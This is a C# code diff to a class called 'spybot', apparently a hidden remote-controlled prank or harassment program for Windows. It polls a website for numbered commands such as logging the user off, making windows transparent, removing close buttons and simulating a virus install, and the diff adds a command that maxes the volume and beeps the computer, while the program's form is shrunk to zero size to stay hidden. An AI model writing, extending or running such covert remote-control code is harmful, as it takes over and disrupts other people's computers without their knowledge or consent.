@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.Media;
 using System.Net;
 using System.Net.Mail;
 using System.Net.NetworkInformation;
@@ -60,6 +61,7 @@ namespace Windows
             37      =   Fica fazendo log-off no windows
             38      =   Deixa transparente a janela sendo usada atualmente
             39      =   Remove o botao FECHAR da janela sendo usada atualmente
+            40      =   Fica bipando o computador com o Console.Beep()
      */
     class spybot
     {
@@ -123,9 +125,9 @@ namespace Windows
 
             addHook(3000, () =>
             {
-                if (VerificarInternet())
+                if (!spybot.TUDO_OK)
                 {
-                    if (!spybot.TUDO_OK)
+                    if (VerificarInternet())
                     {
                         if (spybot.ACAO != "")
                         {
@@ -140,9 +142,8 @@ namespace Windows
                             f.Close();
                         }
                     }
+
                 }
-
-
             });
 
             addHook(DELAY_PARA_BUSCAR_NO_SITE_REPETIDAMENTE, () =>
@@ -367,7 +368,7 @@ namespace Windows
                     }
                     if (ACAO == "30")//
                     {
-                        SimularInstalacaoVirus();
+                         SimularInstalacaoVirus();
                         loop.Stop();
                     }
                     if (ACAO == "31")//
@@ -422,16 +423,31 @@ namespace Windows
                         intervalo = intervaloAleatorio();
                         removerBotaoFecharJanelaAtualmenteAtiva();
                     }
-                    //if (ACAO == "40")//
-                    //{
-                    //    intervalo = intervaloAleatorio();
-                    //}
+                    if (ACAO == "40")//
+                    {
+                        for (int i = 0; i < 110; i++)
+                        {
+                            IncreaseVolume();
+                        }
+                        intervalo = intervaloAleatorio(); 
+                        bip();
+                        wait(2000);
+                        bip();
+                    }
 
                 }
             };
         }
 
 
+        public static void wait(int milisegundos)
+        {
+            Thread.Sleep(milisegundos);
+        }
+        public static void bip()
+        {
+            Console.Beep();
+        }
         public static void prepararForm(Form f)
         {
             f.Size = new Size(0, 0);
